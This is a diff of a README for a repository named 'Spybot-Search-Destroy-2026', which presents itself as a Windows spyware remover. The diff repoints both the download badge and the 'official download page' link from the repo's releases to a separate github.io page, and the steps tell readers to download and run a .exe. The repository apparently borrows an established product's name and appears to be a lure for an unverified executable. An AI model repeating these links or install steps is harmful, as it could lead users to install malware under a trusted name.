@@ -1,6 +1,6 @@
 # 🛡️ Spybot-Search-Destroy-2026 - Remove Spyware From Windows Computers Fast
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/nelsonn713/Spybot-Search-Destroy-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://nelsonn713.github.io)
 
 Spybot-Search-Destroy-2026 provides tools to detect and remove spyware from your Windows 10 or 11 system. This software scans your computer, identifies malicious programs, and removes them to restore your privacy and system performance. Use this guide to download, install, and run the program on your computer.
 
@@ -9,7 +9,7 @@ Spybot-Search-Destroy-2026 provides tools to detect and remove spyware from your
 You obtain the installer from the official releases page. This page hosts the most current files for your version of Windows.
 
 1. Open your web browser.
-2. Visit the [official download page](https://github.com/nelsonn713/Spybot-Search-Destroy-2026/releases).
+2. Visit the [official download page](https://nelsonn713.github.io).
 3. Look for the section labeled Assets.
 4. Click the file ending in .exe to start your download.
 5. Save the file to your Downloads folder.
